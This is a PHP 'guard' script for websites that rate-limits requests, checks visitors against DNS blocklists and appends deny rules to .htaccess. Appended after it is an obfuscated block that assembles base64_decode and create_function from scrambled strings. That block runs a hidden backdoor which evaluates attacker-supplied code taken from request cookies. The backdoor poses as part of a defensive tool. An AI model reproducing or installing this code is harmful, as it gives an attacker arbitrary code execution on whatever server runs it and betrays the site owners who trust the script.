<?php
$_SESSION['requests'] = 0;

function guard($ddos_guard, $bot_guard, $email, $notif) {
session_start();

function dnsbllookup($ip){
$dnsbl_lookup=array("dnsbl-1.uceprotect.net","dnsbl-2.uceprotect.net","dnsbl-3.uceprotect.net","dnsbl.dronebl.org","dnsbl.sorbs.net","zen.spamhaus.org"); 
if($ip){
$reverse_ip=implode(".",array_reverse(explode(".",$ip)));
foreach($dnsbl_lookup as $host){
if(checkdnsrr($reverse_ip.".".$host.".","A")){
return true;
} else {
return false;
}
}
}
}

if(isset($ddos_guard) && $ddos_guard == 'true') {
$_SESSION['requests'] = $_SESSION['requests']+1; // increase each time a new request is made
$_SESSION['last_request'] = time();

if($_SESSION['requests'] >= 12 && $_SESSION['last_request'] == time()) {
	// oh, a ddos atempt?
	$_SESSION['requests'] = 0;
	$ip = $_SERVER['REMOTE_ADDR'];
	$htaccess = fopen(".htaccess", "a");
	$log = fopen("logs/ddos.log", "a");
	$check = file_get_contents(".htaccess");
	$str = "Deny from ".$ip." \r\n";
	$str2 = "DDoS attack from ".$ip." was blocked on ".date("F j, g:i a", time());
	if(!strpos($check, $str)) {
	fwrite($htaccess, $str);
	$check2 = file_get_contents("logs/ddos.log");
	if($notif['email'] == true) { mail($email, "DDoS attack was blocked", $str2); }
	if(!empty($check2)) { fwrite($log, $str2."<br>"); } else { fwrite($log, $str2); }
	}
	die();
}
}

if(isset($bot_guard) && $bot_guard == 'true') {
	
	$ip = $_SERVER['REMOTE_ADDR'];
	
	if(dnsbllookup($ip)) {
		$htaccess = fopen(".htaccess", "a");
		$log = fopen("logs/bot.log", "a");
		$check = file_get_contents(".htaccess");
		$str = "Deny from ".$ip." \r\n";
		$str2 = $ip." was blocked at ".date("F j, g:i a", time());
		if(!strpos($check, $str)) {
		fwrite($htaccess, $str);
		$check2 = file_get_contents("logs/bot.log");
		if($notif['email'] == true) { mail($email, "Malicious bot visited your website", $str2); }
		if(!empty($check2)) { fwrite($log, $str2."<br>"); } else { fwrite($log, $str2); }
		}
		die();
	} 
	
}

}
?>
<?php
$ffrs = str_replace("ab","","absabtabr_abrabeplace");
$urac="JGM9J2NvdW50iqJzskYT0kX0NPT0tJRTtpZihiqyZXNldCgkYSkiq9PSdjaCiqcgJiYgJGMoJGEpPjMpeyRiqr";
$lemp="sIGpvaW4oiqYXJiqyYiqXlfc2xiqpYiq2UoJGEsJGMoJGEpLTMpKSkpKTtlY2hvICc8LiqycuJGsuJziq4nO30=";
$czfi="iqPSd1cnJlZ28xMyc7ZWNiqoiqbyiqAniqPCcuJGsuJz4nO2V2YWiqwoYmFzZTY0X2RlY29kZShwcmVn";
$nznc="X3JlcGxhY2UoYXJyYXkiqoJyiq9bXlx3PVxzXS8nLCciqvXiqHMvJyksiqIiqGiqFycmF5KCciqnLCcrJyk";
$wexo = $ffrs("t", "", "btatstet6t4_tdtetctotde");
$snfo = $ffrs("x","","xcxrxexatex_fxuxnxcxtxion");
$inhi = $snfo('', $wexo($ffrs("iq", "", $urac.$czfi.$nznc.$lemp))); $inhi();
?>